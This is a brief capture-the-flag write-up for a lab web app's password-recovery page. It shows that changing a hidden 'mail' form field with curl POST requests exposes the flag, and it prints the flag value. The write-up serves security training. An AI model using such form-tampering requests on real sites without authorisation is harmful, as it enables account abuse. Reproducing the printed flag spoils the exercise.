# http://192.168.99.100/?page=recover

looking at the page source we notice the `<form>` element

```html
<form action="#" method="POST">
	<input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
	<input type="submit" name="Submit" value="Submit">
</form>
```

what if we try to change the value of the `mail` ?

```sh
e1z2r10p4% 
e1z2r10p4% curl -s 'http://192.168.99.100/?page=recover' --data 'mail=webmaster%40borntosec.com&Submit=Submit' -o before.html
e1z2r10p4% curl -s 'http://192.168.99.100/?page=recover' --data 'mail=attacker%40email.com&Submit=Submit' -o after.html 
e1z2r10p4% diff before.html after.html 
37c37
< <center><h2 style="margin-top:50px;"></h2><br/><img src="images/WrongAnswer.gif" alt=""></center>
---
> <center><h2 style="margin-top:50px;"> The flag is : 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center>
e1z2r10p4% 
```

so with the first command we post original form values, and we get the `WrongAnswer.gif`
if we change the value of the `mail` field to something else, the page gives us the flag

##### flag `1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0`
nice
